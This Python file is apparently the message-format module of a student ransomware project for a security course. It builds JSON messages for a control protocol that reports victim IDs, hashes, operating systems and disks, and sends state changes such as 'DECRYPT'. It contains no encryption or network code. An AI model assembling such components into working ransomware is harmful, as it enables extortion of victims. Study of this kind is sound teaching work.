# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : message

# --------------------------------------------
# Importations
# --------------------------------------------
import json
# --------------------------------------------
# Functions
# --------------------------------------------


def response(key1=None, val1=None, key2=None, val2=None, key3=None, val3=None, key4=None, val4=None, key5=None, val5=None,key6=None,val6=None):
    title = {
        key1: val1,
        key2: val2,
        key3: val3,
        key4: val4,
        key5: val5,
        key6: val6
    }

    title_json = json.dumps(title)

    return title_json


def req(key1, val1):
    title = {
        key1: val1,
    }

    title_json = json.dumps(title)

    return title_json


def end(key1, val1):
    title = {
        key1: val1
    }

    title_json = json.dumps(title)

    return title_json


def state(key1, val1, key2, val2):
    title = {
        key1: val1,
        key2: val2
    }

    title_json = json.dumps(title)

    return title_json

print(response('VICTIM', 'id', 'HASH', 'hash', 'OS','type','DISKS','disks','STATE','state'))
print(req('LIST_REQ', None))
print(end('LIST_END', None))
print(state('CHGSTATE', 'id', 'STATE', 'DECRYPT'))